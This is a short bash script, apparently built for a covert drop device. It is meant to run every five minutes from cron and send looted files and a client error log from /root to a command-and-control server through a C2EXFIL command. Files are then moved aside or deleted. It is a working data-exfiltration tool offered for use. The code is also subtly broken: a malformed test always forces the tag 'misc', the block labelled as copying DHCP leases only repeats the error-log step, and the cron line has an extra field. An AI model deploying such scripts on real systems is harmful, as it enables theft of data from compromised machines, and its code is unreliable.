#!/bin/bash
# Grabs anything in /root/loot and exfils to c2
# Archives in /root/looted
# */5 * * * * * bash /root/scripts/getloot.sh

## vars
loot="/root/loot"
looted="/root/looted"


## functions
exfil() {
  if [ "$2"="" ]
  then
    source="misc"
  else
    source=$2
  fi

  if C2EXFIL STRING $1 ${HOSTNAME}-$source
  then
    mv $1 ${looted}
  else
    echo "error exfiltrating $1"
  fi
}

## look at me go!
# look for loot
for file in ${loot}/*; do
    if [ -f "$file" ]; then
        exfil "$file" "loot"
    fi
done

# look for cc-client-error logs
if [ -f "/var/cc-client-error.log" ]
  then
    if exfil /var/cc-client-error.log cc-client-log
    then
      rm /var/cc-client-error.log
    fi
fi

# copy our dhcp leases file
if [ -f "/var/cc-client-error.log" ]
  then
    if exfil /var/cc-client-error.log cc-client-log
    then
      rm /var/cc-client-error.log
    fi
fi